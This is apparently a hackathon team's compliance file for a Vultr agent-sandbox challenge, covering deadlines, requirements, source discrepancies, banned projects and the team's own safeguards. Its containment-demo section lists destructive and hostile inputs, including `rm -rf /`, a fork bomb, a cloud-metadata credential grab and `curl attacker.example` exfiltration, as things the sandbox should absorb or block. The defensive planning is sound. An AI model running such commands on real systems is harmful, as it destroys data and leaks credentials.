# 01 · Rules and Compliance: Requirements, Discrepancies, Deadlines (Challenge 1 "Blast Radius Zero")

Rules owner file. Last full check: **2026-09-26 16:20–16:50 IST (03:50–04:20 PDT, 10:50–11:20 UTC)**. The event has not started yet: doors open in about 5 h and hacking starts in 7.5 h.

**Sources and how each was checked:**
- **C1, C2, NB docs.** Organizer Google Docs, fetched with a public `export?format=txt` (**worked, HTTP 200, no login**).
  - Byte-identical to the morning captures in `../.firecrawl/event/gdoc_*.txt`.
  - Fresh copies are in `raw/vultr/gdoc_*.txt`.
- **Guide.** `00-participant-guide.md`, a condensed, secrets-redacted copy of the participant guide.
  - The original guide wasn't available to re-fetch, so anything sourced only to the guide ranks lower than the organizer docs.
- **CV.** The Cerebral Valley event page (public part). Fetched live with curl: `raw/vultr/cv_event.html`.
  - `/details`, `/hackathon` and `/hackathon/submit` still need a login and weren't accessed.

**Authority levels, strongest first:**
1. **Organizer doc**: the Google Docs, and CV event metadata.
2. **Guide**: the participant-guide copy.
3. **Inferred**: our reading of the above.
4. **Our safeguard**: a proposal of ours. It is **not** a rule.

Redactions: Wi-Fi password, credit coupon code, Discord invite link and any tokens are left out on purpose.

---

## 1. Verified schedule (event TZ = America/Los_Angeles, PDT = UTC−7; IST = UTC+5:30 = PDT+12:30)

**Evidence that the event runs on PT:** the CV record has `"timeZone":"America/Los_Angeles"`, `"startDateTime":"2026-09-26 16:00:00"` and `"endDateTime":"2026-09-28 00:00:00"`. Read as UTC, that is 09:00 PDT to 17:00 PDT, which matches the guide's doors-open and doors-close times, so the stored values are UTC. **Verified live at 10:50Z.** US DST ends Nov 1, 2026, so the whole event is on PDT. Conversions were computed with Python `zoneinfo`.

| PDT (event) | UTC | IST (us) | Item | Source / authority |
|---|---|---|---|---|
| Sat Sep 26 09:00 | Sat 16:00 | **Sat 21:30** | Doors, breakfast, team formation | Guide + CV `startDateTime` |
| Sat 11:00 | Sat 18:00 | Sat 23:30 | Kickoff. The credit coupon is emailed "after opening ceremony" | Guide; C1/C2 docs |
| Sat 11:30 | Sat 18:30 | **Sun Sep 27 00:00** | Hacking begins | Guide |
| Sat 13:00 / 19:00 | 20:00 / Sun 02:00 | Sun 01:30 / 07:30 | Lunch / dinner | Guide |
| Sat 22:00 | Sun 05:00 | Sun 10:30 | Doors close (overnight stay) | Guide |
| Sun Sep 27 09:00 | Sun 16:00 | Sun 21:30 | Doors | Guide |
| **Sun 12:00** | **Sun 19:00** | **Mon Sep 28 00:30** | **Hacking stops, submissions due** | Guide only |
| Sun 12:30 | 19:30 | Mon 01:00 | Round-1 judging | Guide |
| Sun 14:30 | 21:30 | Mon 03:00 | Final judging (top 6 on stage) | Guide |
| Sun 15:30 | 22:30 | Mon 04:00 | Winners | Guide |
| Sun 17:00 | Mon 00:00 | Mon 05:30 | Doors close. Also CV `hackathonSubmissionDueDate` | Guide + CV (organizer metadata) |
| Sun 23:00 | Mon 06:00 | Mon 11:30 | CV due date + `submissionDueDateGracePeriodHours: 6` (platform only) | CV metadata |

**Operative deadline: Sun Sep 27 12:00 PDT = Mon Sep 28 00:30 IST.** That is 32 h 00 m from 16:30 IST today, and 24 h 30 m of hacking time. Internal target: freeze submission at **11:30 PDT (Mon 00:00 IST)**.

Other CV flags, checked live:
- `showHackathonGallery:false`
- `hackathonPublicVotingEnabled:false`
- `hackathonJudgingOpen:null`

---

## 2. Requirements matrix (Challenge 1 + global rules + NetBird bonus)

"Last checked" for every row is 2026-09-26 16:20–16:50 IST unless noted. Quotes are copied verbatim from the organizer docs.

### 2a. Challenge 1 organizer requirements

| ID | Exact supported meaning (quote) | Source | Authority | Design implication | Demo proof | Uncertainty |
|---|---|---|---|---|---|---|
| C1-01 | "Deploy a VM-based backend on Vultr (mandatory)"; Required: "Vultr VM backend" | C1 doc, *What We're Looking For* and *Technology* | Organizer doc | The backend runs on a Vultr Cloud Compute VM (not only VKE, Serverless or Object Storage) | Vultr console showing the instance, plus the app's `/healthz` served from it | Low |
| C1-02 | "Agent LLM calls must go through Vultr Serverless Inference (mandatory)"; "Vultr Serverless Inference for agent reasoning (OpenAI-compatible; base URL https://api.vultrinference.com/v1)" | C1 doc | Organizer doc | **Every** model call on the agent path (planner, executor, guard, vision verifier) goes to `api.vultrinference.com`. No OpenAI, Anthropic or OpenRouter fallback anywhere in the runtime path. | Show the LLM client config and a live request log (model id + Vultr host) | Medium: unclear whether local non-LLM models (e.g. an embedder) are allowed. Avoid them or declare them. Dev-time coding assistants are not "agent LLM calls" (inferred). |
| C1-03 | "Vultr should be the central system of control and orchestration, not just static hosting" | C1 doc | Organizer doc | The control plane (planner, dispatcher, state, audit) runs on Vultr and drives Vultr resources (sandbox host, optionally the Vultr API for throwaway VMs, Object Storage for artifacts) | Architecture slide plus live UI showing dispatch to Vultr resources | Low |
| C1-04 | "Sandboxes run as containers or throwaway instances on Vultr, never inside your app process"; Required: "A sandbox isolated from your application process" | C1 doc | Organizer doc | Model-generated code and commands never run via `exec`/`eval`/`subprocess` in the app. They go to a container (Docker; gVisor recommended) or a separate VM. **Hosted E2B Cloud or Browserbase would fail "on Vultr".** | `docker ps` / `runsc ps` on the sandbox host during a run; the app process tree has no children | Low. Whether a sandbox container on the *same* VM as the app qualifies: the letter says yes (container, not in-process). We still use a separate VM (safeguard S-02). |
| C1-05 | "Build a web-based agent that performs real work - writing and running code, or operating a real browser" | C1 doc | Organizer doc | Pick Pattern A (code), Pattern B (browser) or both. Only Pattern A needs no vision model. | A live task producing an artifact | Low |
| C1-06 | "with every action contained inside a sandbox running on Vultr" | C1 doc | Organizer doc | Every agent **tool** that touches files, network or processes executes in the sandbox. The control plane only plans and verifies. | Tool registry shows every tool is `dispatch → sandbox` | Medium: "every action" arguably includes web fetches. Route them through the sandbox or egress proxy too. |
| C1-07 | "act as a centralized control layer that plans a task, dispatches it to an isolated execution environment, and returns verifiable output" | C1 doc | Organizer doc | Explicit plan object, a dispatch record, and output with provenance (hashes, logs, screenshots) | UI shows plan, then dispatch, then artifact with a hash | Low. What counts as "verifiable" is unspecified (inferred: reproducible logs + hashes). |
| C1-08 | "multi-step agentic workflows, real executed results rather than described ones" | C1 doc | Organizer doc | At least 2 tool rounds per task. Show actual stdout, files and screenshots, never the model's narration of them. | Retry loop visible | Low |
| C1-09 | "production-style web application"; "Must be accessible via a public web browser"; "Clear user flows, not just a local demo" | C1 doc | Organizer doc | Public HTTPS URL, auth, a clear task flow. No localhost or Streamlit (see G-06). | Open the URL on a judge's phone | Low |
| C1-10 | "Containment-first is required." Focus: "Process isolation - execution never touches the host or app runtime"; "Secret hygiene - no API keys or credentials inside the sandbox"; "Resource limits - time and memory caps on every run"; "Lifecycle discipline - reset or destroy the environment after each task" | C1 doc, *Containment Focus* | Organizer doc ("Address real safety…") | The four controls are the scoring spine. Every run gets a wall-clock timeout, memory, CPU and PID caps, and a destroy or reset step. No env vars or files with keys in the sandbox (this includes Vultr `user_data`; see 13 §6). | Per-run card: limits applied, secrets = none, "destroyed at T" | Low on intent. "Required" attaches to containment-first overall. The four items are phrased as focus areas. |
| C1-11 | Deliverables ("Each team must provide"): "✅ GitHub repository with setup and documentation"; "✅ Vultr VM backend deployment, with agent LLM calls through Vultr Serverless Inference"; "✅ Public demo URL"; "✅ Recorded demo video"; "✅ One containment moment in the video - the sandbox absorbing something unsafe, such as an rm -rf, an infinite loop, or a hostile web page"; "Clear explanation of architecture and use case" | C1 doc, *Developer Expectations* | Organizer doc | See §5 (containment moment) and §6 (submission checklist) | Video timestamp list | The last bullet has no ✅. Treat it as required anyway. |
| C1-12 | Required: "Web application deployed on Vultr" | C1 doc, *Technology* | Organizer doc | The frontend is served from Vultr too (VM or Vultr-hosted), not Vercel or Netlify | DNS/IP of the URL resolves to Vultr (or the NetBird proxy on Vultr) | Low |
| C1-13 | Pattern A: "On error, stderr is fed back for a retry." Pattern B: "Playwright in a container… a vision model on Serverless Inference verifies the result → repeat, with a human approving anything final" | C1 doc, *Execution Pattern Integration* | Organizer doc (pattern description) | If Pattern A: an automatic stderr→model retry loop. If Pattern B: a vision model on Vultr Inference plus a human approval gate. | Show one failed run that self-repairs | Low |
| C1-14 | Strongly recommended: "Docker container as the sandbox boundary"; "REST or WebSocket APIs for run status and streaming output"; "Web dashboards showing the execution loop, retries, and screenshot trails"; "Approve-before-submit gates on any irreversible browser action" | C1 doc | Organizer doc (recommendation) | Do all four; they're cheap. The dashboard must not be the *main* feature (G-06). | Live streaming run view | Low |
| C1-15 | Optional: "Vultr API to spin up a throwaway instance per task and destroy it afterward, making Vultr itself the sandbox fabric"; "Vision-capable models…"; "Playwright in Docker" | C1 doc | Organizer doc (optional) | Throwaway-VM tier is a differentiator, not a requirement | VM created and then deleted in the UI | Low |

### 2b. Global rules (all projects)

| ID | Meaning (verbatim where available) | Source | Authority | Design implication | Proof | Uncertainty |
|---|---|---|---|---|---|---|
| G-01 | "Repos must be public" | Guide | Guide | Flip the repo to public before submitting. Scan for secrets first (gitleaks/trufflehog). | Repo URL opens logged-out | Low |
| G-02 | "Max 4 per team; solo allowed"; CV: "Teams may have up to four members" | Guide + CV page | Organizer (CV) | n/a | n/a | Low |
| G-03 | "Demo must only show what was built during the hackathon; must clearly identify original contributions or be disqualified" | Guide | Guide | README "Built at the event vs reused" table listing every OSS dependency (gVisor, Playwright, NetBird, etc.). Git history starts after 11:30 PDT Sat. | README section, and commit timestamps | Medium: the original guide wording wasn't re-fetched |
| G-04 | "New work only" | Guide | Guide | No pre-existing project code. Research notes are fine (inferred). | Commit history | Medium: unclear whether the pre-event research repo must stay separate. Keep the product repo fresh. |
| G-05 | "Banned: illegal/unethical, or using unlicensed code/data/assets" | Guide | Guide | License check on every copied snippet, image and dataset. Hostile-page demo content must be our own. | LICENSES / NOTICE file | Low |
| G-06 | Anti-projects (§4) | Guide | Guide | Our product must not reduce to any listed item | n/a | See §4 |
| G-07 | "Submit at the link above, with a 1-minute demo video showing only what the team built" | Guide | Guide | Record a **60 s** cut **and** separately rehearse the ~3 min live demo | Video length ≤ 1:00 | **Conflict D-06** |
| G-08 | Judging R1 (~3 min demo + 1–2 min Q&A): Technicality 40%, Creativity/Originality 25%, Live Demo 20%, Future Potential & AI Impact 15%. R2: top 6, "same criteria, equal weights" | Guide | Guide | Invest in technical depth plus a reliable live demo | n/a | Medium: the rubric appears on no organizer page we could reach |
| G-09 | "Vultr GPUs are not available for this event" | C2 doc | Organizer doc (in C2) | No GPU plans. All models come via Serverless Inference. | n/a | Low. Stated in C2 only; assume it applies to C1 too. |
| G-10 | Waiver: perpetual licence to organizer and partners; no confidentiality | CV apply/waiver (captured in morning file 01-event…) | Organizer (CV) | Don't pitch anything we can't share | n/a | Low |

### 2c. NetBird bonus (optional, stacks on C1)

| ID | Meaning (verbatim) | Source | Authority | Design implication | Proof | Uncertainty |
|---|---|---|---|---|---|---|
| NB-01 | "No open ports- your public demo URL is served through NetBird, with no inbound application ports on the VM" | NB doc | Organizer doc | App VM firewall group has zero inbound app rules. The NetBird management/proxy VM needs 80/443 TCP + 3478 UDP (see 14). | Vultr firewall view + URL loading | **Medium: "the VM" is ambiguous when self-hosting; see Q-03** |
| NB-02 | "Gated access- the service sits behind SSO, password, PIN, or header auth, matched to a real user role" | NB doc | Organizer doc | Map NetBird groups to our roles (e.g. `reviewers`, `operators`) | Auth prompt; allowed vs denied user | Medium: what counts as a "real user role" is undefined |
| NB-03 | "Lifecycle-bound URLs- URLs are provisioned per task or session and expire with the workload that created them" | NB doc | Organizer doc | Per-task service create/delete bound to the sandbox lifecycle | URL dies after task | Low |
| NB-04 | "Include a zero-ports moment in your demo video: show your firewall with no inbound application ports open, then load the public URL in a browser. Show the auth prompt if you're claiming the second tier, and a URL going dead after its task if you're claiming the third." | NB doc | Organizer doc | Script this as a separate 10–15 s video beat | Video | Low. Conflicts with the 60 s video budget (D-06). |
| NB-05 | "Keep one service live for judging and put any credentials in your README- ephemeral URLs expire about 90 seconds after the client stops." | NB doc | Organizer doc | A **permanent** judge service plus a README credential for a **low-privilege judge role only** | README | Low. Publishing credentials in a public repo is intended. Scope them. |
| NB-06 | "Self-host the management server on Vultr and the whole path stays on your own infrastructure." | NB doc | Organizer doc | Deploy the NetBird Marketplace app on Vultr | Console | Low. Phrased as description, not a hard requirement. NetBird Cloud would likely score lower (inferred). |

#### 2c-1. Organizer clarification (Discord, after kickoff) — supersedes the cumulative-tier reading of NB-01…NB-04

Authority: organizer doc. Quoted verbatim:

> **Clarification: Zero-Port Access Bonus**
>
> Hi everyone! A few of you have noticed that the participant guide and the kickoff slide describe the bonus criteria a little differently. Here's the official clarification.
>
> You do not need to demonstrate every criterion. The bonus is awarded for meaningful use of NetBird in your Challenge 1 or Challenge 2 project, and any of the following approaches qualifies:
>
> 1. No open ports: your public demo URL is served through the NetBird reverse proxy, with no inbound application ports open on your Vultr VM.
> 2. Gated access: the exposed service sits behind SSO, password, PIN, or header auth, matched to a real user role.
> 3. Peer-to-peer connectivity: machines on your NetBird network reach each other directly over WireGuard.
> 4. Lifecycle-bound URLs: task or session URLs that expire along with the workload.
>
> Combining approaches is welcome and may strengthen your submission.
>
> To make sure judges can credit you, please show how you're using NetBird in your demo or README (for example, a screenshot of your proxy config, access policy, or peer connections).

| ID | Meaning | Design implication | Proof |
|---|---|---|---|
| NB-07 | Any **one** of the four approaches qualifies; combining "may strengthen". The bullets are not cumulative tiers (answers Q-09). | Pick by fit to the product, not by tier count. Airlock: approach 3 for the controller → supervisor link, plus 1 and 2 for the public URL (38 §3.4). Approach 4 is not pursued. | — |
| NB-08 | New approach: **peer-to-peer connectivity** over WireGuard between machines on the NetBird network. | No reverse proxy, domain, wildcard cert or expose cap needed for this approach. | Dashboard peer list showing a direct connection; access policy; `ss -ltn` on the target bound to the NetBird address |
| NB-09 | Evidence may be in the **demo or README**, e.g. screenshots of proxy config, access policy, or peer connections. Softens NB-04's "zero-ports moment in the video". | Put screenshots and the judge credentials in the README; still show the firewall/URL beat on video. | README section + video beat |

---

## 3. Discrepancy register

| # | Topic | Source A says | Source B says | Evidence (checked today) | Resolution / our stance |
|---|---|---|---|---|---|
| D-01 | Model-list URL | Guide: `https://api.vultrinference.com/v1/chat/models` | C1 doc: `https://api.vultrinference.com/v1/models` | Live 10:49Z: `/v1/chat/models` → **404 "Not found"**; `/v1/models` → **200**, 19 models, no key needed | Use `/v1/models`. The guide has a typo. |
| D-02 | Credits | Guide + C1 doc: "$200 in free Vultr credits **per participant**" | C2 doc: "$200 in free Vultr credits **per team leader**" | Docs re-exported, unchanged | Budget **$200 per team**. Anything more is upside. Ask organizers (Q-01). |
| D-03 | Challenge 2 theme | Guide: "Future of Work: **AI + Robotics** on Vultr" | C2 doc title: "Powering the Future of Work with Scalable, Deployed AI Agents". **No robotics**, only enterprise domains; "Simulation or digital twin integration" strongly recommended | C2 export re-read | Irrelevant to our C1 build. Note it in case judges ask. |
| D-04 | Submission deadline | Guide: Sun 12:00 PM "hacking stops, submissions due" | CV metadata: `hackathonSubmissionDueDate 2026-09-28 00:00 UTC` = **Sun 17:00 PDT**, plus 6 h grace | Live CV page fetch 10:50Z | **12:00 PDT is binding.** Round-1 judging starts 12:30. The form staying open is a platform default, not permission. |
| D-05 | Sandbox examples | Guide lists OpenSandbox, gVisor, E2B | C1 doc adds **Microsandbox**. Vultr's own blueprint uses Microsandbox on VX1. | C1 export | Examples only; any compliant sandbox is fine |
| D-06 | Video length vs demo | Guide: "1-minute demo video" | Guide R1: "~3 min demo + 1–2 min Q&A". C1 doc: "Recorded demo video" (no length) plus a required containment moment. NB doc adds a zero-ports moment. | n/a | Fit the containment moment (~15 s) and zero-ports moment (~15 s) inside **≤ 60 s**. Keep a 3-min live script. Ask Q-02. |
| D-07 | HR screening | Guide anti-list: "AI job-application screener" | C2 doc example: "HR & Recruitment - Screen candidates…" | n/a | Not relevant for C1. Don't build a screener. |
| D-08 | Tool-calling models | Vultr docs (older): tool calling "only on the kimi-k2-instruct model" (per morning capture) | Live `/v1/models`: **14** models advertise `tools` | Live parse 10:49Z | Trust the live catalog. **Correction to README/02: 14 tool-capable models, not 15** (the other 5 are 3 rerankers, `nemotron-3.5-content-safety` and `z-image-turbo`). |
| D-09 | Inference pricing | FAQ/support page + product page: flat **$0.55/M in, $2.75/M out** | Live `/v1/models`: per-model prices $0.09–0.75 in / $0.18–3.00 out. **vultr.com/pricing (live, no cache)** lists a *different* catalog (MiniMax-M2.7, Kimi-K2.6, GLM-5.1-FP8, DeepSeek-V4-Flash at $0.30/$1.00…) | All three fetched today | Billing truth is unknown. Watch the console Usage tab and `/v1/usage` after the first hour. Our budget uses the **highest** plausible rate. |
| D-10 | Doc URLs | C1 doc: `docs.vultr.com/products/serverless/inference/provisioning` | Redirects to `/products/compute/serverless-inference/provisioning` (200) | curl -IL | Cosmetic |
| D-11 | Auth error code | Morning note: every endpoint except `/models` returns 401 without a key | True for a *missing* key (401 "No API key provided"). An *invalid* key returns **422 "Invalid API key"** | Dry run 10:56Z | Handle 401 **and** 422 as auth failures in the client |
| D-12 | NetBird "no open ports" | NB doc: no inbound application ports "on the VM" | NetBird self-host docs: the management host "must be publicly accessible on TCP ports 80 and 443, and UDP port 3478" | NetBird quickstart fetched today | Two VMs: the app VM with zero inbound, and the NetBird VM with 80/443/3478. Say so explicitly on video. Ask Q-03. |
| D-13 | NetBird URL lifetime vs judge access | NB tier 3: URLs "expire with the workload" | NB claim: "Keep one service live for judging" | NB doc | Two service classes: one permanent judge service and per-task ephemeral services |
| D-14 | Event name | Guide/README: "Vultr Agent Arena Hackathon" | CV: "The Agent Arena Hackathon" (host Vultr); NetBird newsletter: NetBird = "track partner" | CV page | Cosmetic |

---

## 4. Banned / anti-project list and exceptions

**Verbatim as recorded in `00-participant-guide.md`.** This is a condensed, secrets-redacted copy of the organizer guide. The original guide text was **not** re-fetchable, so wording may differ slightly from the original.

> Rules
> - Repos must be public
> - Max 4 per team; solo allowed
> - Demo must only show what was built during the hackathon; must clearly identify original contributions or be disqualified
> - New work only
> - Banned: illegal/unethical, or using unlicensed code/data/assets
> - Anti-projects: basic mental-health chatbots, basic RAG, Streamlit apps, basic image analyzers, "AI for Education" chatbot, AI job-application screener, basic nutrition-coach chatbot, personality analyzers, dashboard-as-main-feature, sports analyzers/coaches

**Exceptions:** our copy states **no explicit exceptions**. The only carve-outs are implicit in the qualifiers:
- "**basic**" (mental-health chatbots, RAG, image analyzers, nutrition-coach) implies non-basic variants aren't automatically banned. **Inferred**, not stated.
- "dashboard-**as-main-feature**" implies a dashboard as a *supporting* view is fine. C1 itself strongly recommends "Web dashboards showing the execution loop". **Inferred.**
- The C2 doc's "HR & Recruitment - Screen candidates" example conflicts with the "AI job-application screener" ban (D-07). No resolution is published.

**Our exposure:**
- **Dashboard-as-main-feature.** The product must be the agent that executes work, with the run view secondary.
- **Streamlit.** Don't use it at all.
- **Basic RAG.** Don't make retrieval the product. The Vultr vector store is fine as internal memory.
- **Basic image analyzer.** The Pattern B vision verifier must be one step in a loop, not the product.

---

## 5. The "containment moment" requirement

**Organizer text (C1 doc, verbatim):** "✅ One containment moment in the video - the sandbox absorbing something unsafe, such as an rm -rf, an infinite loop, or a hostile web page"

**What is strictly required:**
- **One** moment.
- It must appear **in the recorded video**.
- The **sandbox** must *absorb* an unsafe action. Our reading: the action executes, or is attempted, inside the sandbox, and the host, app and other tasks are demonstrably unaffected.

"Blocked before execution by a regex" is arguably *not* "the sandbox absorbing" it. **Inferred:** show the action actually running and failing to cause harm. A pre-filter can appear additionally.

**Minimum compliant beat (≈15 s):**
1. The agent (or a scripted hostile input) runs `rm -rf / --no-preserve-root` in the sandbox. Output shows files vanishing inside the sandbox.
2. Cut to the host or app: still healthy. The next task runs in a fresh sandbox with files intact.
3. A run card shows the limits hit (memory, PIDs, time) and "sandbox destroyed".

**Better, and still honest (our choice, not required):** a sequence of 2–3 beats in the live demo:
- a fork bomb (PID cap)
- `while true` (wall-clock kill)
- a metadata or credential grab (`curl 169.254.169.254/v1.json` → blocked)
- egress exfiltration (`curl attacker.example` → blocked)

Only **one** is required for the video.

**Proof artifacts to capture:** timestamps; the sandbox id; the host `uptime`/health before and after; a hash of the untouched host file; the destroy event.

---

## 6. Submission fields and checklist

The event-specific form is **login-gated and not seen**. The CV platform's standard preset fields, from the submit-page code captured this morning:
- Team name, and Team Members (added by CV account search, so **every member needs a CV account**)
- GitHub Repository URL
- Demo Video URL (YouTube, Vimeo, Google Drive, X, Facebook, Dailymotion or Twitch)
- Project Website URL
- Hugging Face URL (optional)
- Project Description (long text)

Event-specific custom questions (challenge choice, NetBird claim) are **unknown**.

**Pre-submit checklist.** Organizer-derived items carry an ID; the rest are ours.
- [ ] Repo **public**, and secret-scanned before flipping (G-01)
- [ ] README: setup, architecture diagram, use case (C1-11); "built here vs reused" table (G-03); licences (G-05)
- [ ] Public demo URL live and reachable logged-out (C1-09)
- [ ] Video ≤ 60 s (G-07), including a containment moment (C1-11). If claiming NetBird, a zero-ports moment and an auth prompt (NB-04).
- [ ] Video link set to public or unlisted, and tested in an incognito window
- [ ] If claiming NetBird: one permanent judge service, and **judge-role** credentials in the README (NB-05)
- [ ] Project description states: Challenge 1, the NetBird tiers claimed, the Vultr products used, and the models used
- [ ] Submitted by **12:00 PDT Sun (00:30 IST Mon)**. Internal freeze 11:30 PDT.

---

## 7. Organizer requirements vs our proposed safeguards (kept separate on purpose)

The requirements are the rows in §2. The items below are **our safeguards**. Nobody requires them, and they must not be described to judges as rules.

| ID | Safeguard (ours) | Why | Maps to |
|---|---|---|---|
| S-01 | gVisor (`runsc`) instead of plain runc for container sandboxes | Kernel-escape resistance. Answers "isn't Docker enough?" | C1-04, C1-10 |
| S-02 | Sandbox host on a **separate VM** from the control plane (keys live only on the control plane) | The blast radius of a sandbox escape excludes the API keys | C1-10 secret hygiene |
| S-03 | Default-deny egress (`--network none`, or an internal network plus an allowlisting proxy, plus nftables); block `169.254.169.254` | The Vultr firewall doesn't filter egress (verified). Metadata serves `user-data`. | C1-10 |
| S-04 | No secrets in Vultr `user_data` of any sandbox VM. One-off, short-TTL NetBird setup keys only. | Metadata `v1.json` is readable in-VM with a static header | C1-10 |
| S-05 | Per-run caps: `--memory`, `--cpus`, `--pids-limit`, `--read-only`, `--cap-drop ALL`, no-new-privileges, wall-clock timeout, output-size cap | Makes "time and memory caps on every run" concrete | C1-10 |
| S-06 | Janitor: delete any `sandbox`-tagged Vultr instance or NetBird service older than its TTL | Stops leaked spend and leaked URLs | C1-10 lifecycle, NB-03 |
| S-07 | Signed/hashed run receipts (stdout, files, screenshots) | Makes the output "verifiable" | C1-07 |
| S-08 | Human approval on irreversible actions | Recommended in C1, and good practice | C1-13/14 |
| S-09 | Guard model `nemotron-3.5-content-safety` via Vultr Inference as a pre-dispatch screen | Defense in depth. Keeps the containment claim about the *sandbox*, not the filter. | C1-02 compatible |

---

## 8. Open questions for organizers (ask at kickoff / Discord)

- **Q-01:** Are credits $200 per participant or per team leader? Can each teammate redeem?
- **Q-02:** Is the demo video strictly ≤ 1 minute? Can it exceed 60 s to fit the containment moment and the NetBird zero-ports moment?
- **Q-03:** For the NetBird bonus with a self-hosted management server, is it acceptable that the NetBird VM exposes 80/443/3478 while the *app* VM has zero inbound ports? Can SSH (22) stay open on the app VM if restricted to our IP, or must it be zero inbound?
- **Q-04:** Does NetBird Cloud (not self-hosted) still qualify for the bonus? (Still open after the clarification in §2c-1; it says "meaningful use of NetBird" without naming self-hosting. Self-host anyway.)
- **Q-09 (answered):** the bonus bullets are not cumulative; any one approach qualifies (§2c-1).
- **Q-05:** Are any non-Vultr model calls allowed at all (e.g. a local embedding model), or strictly Vultr Inference for everything model-shaped?
- **Q-06:** Is 12:00 PDT a hard deadline for the form, given it stays open until 17:00 (+6 h)?
- **Q-07:** What are the event-specific submit-form questions? Do we declare the challenge and bonus tiers there?
- **Q-08:** Can the product repo include utility code written before the event (e.g. research notes, scripts), if declared?

Organizer contact given in the C1/C2 docs for credit issues: gina@cerebralvalley.ai.
